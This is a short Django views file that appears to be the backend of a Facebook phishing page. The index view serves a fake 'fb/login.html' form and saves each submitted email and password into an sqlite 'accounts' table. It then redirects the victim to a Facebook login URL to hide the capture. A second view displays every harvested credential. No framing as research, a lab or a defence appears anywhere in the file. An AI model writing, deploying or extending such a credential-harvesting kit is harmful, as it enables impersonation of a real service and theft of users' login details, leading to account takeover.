from django.http import HttpResponseRedirect
from django.shortcuts import render
import sqlite3
# Create your views here.


def index(request):
    global count
    conn = sqlite3.connect("accounts.sqlite3") 
    c = conn.cursor()
    # c.execute("delete from accounts")
    if request.method == "POST": 
        email = request.POST.get('email', '')
        password = request.POST.get('pass', '')
        c.execute(f"insert into accounts values (:email, :password, 'facebook')", {"email":email, "password": password})
        conn.commit()
        c.close()
        return HttpResponseRedirect("https:www.ar.facebook.com/login?")
    return render(request, "fb/login.html")


def table(request):
    conn = sqlite3.connect("accounts.sqlite3")
    c = conn.cursor()
    accounts = c.execute("select * from accounts").fetchall()
    return render(request, "fb/table.html",{
        "accounts":accounts
    })
